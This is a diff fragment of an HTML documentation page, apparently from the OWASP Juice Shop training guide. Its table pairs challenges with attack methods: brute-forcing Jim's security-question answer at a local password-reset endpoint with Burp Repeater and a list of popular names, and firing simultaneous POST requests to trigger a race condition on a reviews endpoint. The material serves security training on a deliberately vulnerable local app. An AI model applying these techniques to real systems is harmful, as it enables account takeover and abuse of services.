+<td class="tableblock halign-left valign-top"><p class="tableblock">Burpsuite (Community Edition) <em>Repeater</em> with <a href="https://www.ssa.gov/oact/babynames/decades/century.html">Top Names Over the Last 100 Years</a> into <a href="http://localhost:3000/rest/user/reset-password">Password Reset API endpoint</a> for email <code>jim@juice-sh.op</code></p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Contains answer to Jim&#8217;s security question as 44th of Top 100 male names of 1919-2018. List needs to be manually prepared from HTML page.</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">🧠🧠</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">⏳⏳</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Reset Jim&#8217;s Password(✔️)</p></td>
+</tr>
+<tr>
+<td class="tableblock halign-left valign-top"><p class="tableblock"><a href="https://github.com/aaronhnatiw/race-the-web">RaceTheWeb</a> config (or custom Bash, Python etc. script) sending 3 simultaneous <code>POST</code> requests to <a href="http://localhost:3000/rest/products/reviews">Like Reviews API endpoint</a></p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Requests must be processed within 150ms time window to exploit race condition flaw</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">🧠(🧠🧠)</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">⏳</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Multiple Likes(✔️)</p></td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+</article>
+  </div>
+</main>
+</div>
+<footer class="footer">
+  <p>This page was built using the Antora default UI.</p>
+  <p>The source code for this UI is licensed under the terms of the MPL-2.0 license.</p>
+</footer>
+<script id="site-script" src="../../../../_/js/site.js" data-ui-root-path="../../../../_"></script>
+<script async src="../../../../_/js/vendor/highlight.js"></script>
+  </body>
+</html>
